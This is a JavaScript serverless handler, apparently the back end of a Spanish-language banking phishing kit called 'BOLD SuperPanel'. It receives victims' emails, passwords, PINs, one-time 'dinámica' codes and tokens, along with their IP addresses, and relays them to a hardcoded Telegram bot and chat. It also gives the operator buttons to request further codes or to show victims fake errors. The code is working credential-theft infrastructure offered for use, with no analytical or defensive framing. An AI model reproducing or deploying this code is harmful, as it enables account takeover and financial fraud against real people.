const BOT_TOKEN = process.env.BOT_TOKEN || '8775807272:AAGIA8gNoQy2GQqx_Drwj_KEQF8tnkfr3pY';
const CHAT_ID   = process.env.CHAT_ID   || '7776240161';
const API_BASE  = `https://api.telegram.org/bot${BOT_TOKEN}`;

module.exports = async function handler(req, res) {
  res.setHeader('Content-Type', 'application/json; charset=utf-8');

  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: 'Method not allowed' });
  }

  const data = req.body;
  if (!data || typeof data !== 'object') {
    return res.status(400).json({ ok: false, error: 'JSON inválido' });
  }

  const event     = String(data.event || 'CLAVE').toUpperCase().trim();
  const email     = String(data.email || 'N/A').trim();
  const ip        = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'N/A';
  const hora      = new Intl.DateTimeFormat('sv-SE', {
    timeZone: 'America/Bogota',
    year: 'numeric', month: '2-digit', day: '2-digit',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    hour12: false,
  }).format(new Date()).replace('T', ' ');
  const messageid = parseInt(data.messageid) || 0;

  let text = '🔐 *BOLD SuperPanel*\n';
  text += '━━━━━━━━━━━━━━━━━━━━━\n';
  text += `📧 Email       : \`${email}\`\n`;
  if (data.clave)    text += `🔑 Contraseña  : \`${data.clave}\`\n`;
  if (data.pin)      text += `🔢 PIN         : \`${data.pin}\`\n`;
  if (data.dinamica) text += `📲 Dinámica    : \`${data.dinamica}\`\n`;
  if (data.token)    text += `💬 Token       : \`${data.token}\`\n`;
  text += `🌐 IP          : \`${ip}\`\n`;
  text += `🕐 Hora        : \`${hora}\`\n`;
  text += `📍 Evento      : \`${event}\`\n`;

  const inline_keyboard = [
    [
      { text: '🔑 Pedir PIN',      callback_data: 'ACTION:NEXT_PIN' },
      { text: '🔢 Pedir Dinámica', callback_data: 'ACTION:NEXT_DINAMICA' },
      { text: '💬 Pedir Token',    callback_data: 'ACTION:NEXT_TOKEN' },
    ],
    [
      { text: '❌ Err Usuario',    callback_data: 'ACTION:ERR_USUARIO' },
      { text: '❌ Err Contraseña', callback_data: 'ACTION:ERR_CLAVE' },
      { text: '❌ Err PIN',        callback_data: 'ACTION:ERR_PIN' },
    ],
    [
      { text: '❌ Err Dinámica',   callback_data: 'ACTION:ERR_DINAMICA' },
      { text: '❌ Err Token',      callback_data: 'ACTION:ERR_TOKEN' },
      { text: '✅ Finalizar',      callback_data: 'ACTION:FINISH' },
    ],
  ];

  const payload = {
    chat_id:      CHAT_ID,
    text,
    parse_mode:   'Markdown',
    reply_markup: JSON.stringify({ inline_keyboard }),
  };

  const tgMethod = messageid > 0 ? 'editMessageText' : 'sendMessage';
  if (messageid > 0) payload.message_id = messageid;

  try {
    const tgRes  = await fetch(`${API_BASE}/${tgMethod}`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify(payload),
    });
    const result = await tgRes.json();
    const ok     = result.ok ?? false;
    const newId  = messageid > 0 ? messageid : (ok ? (result.result?.message_id ?? null) : null);

    return res.json({ ok, messageid: newId, chatid: CHAT_ID });
  } catch (err) {
    return res.status(500).json({ ok: false, error: err.message });
  }
};
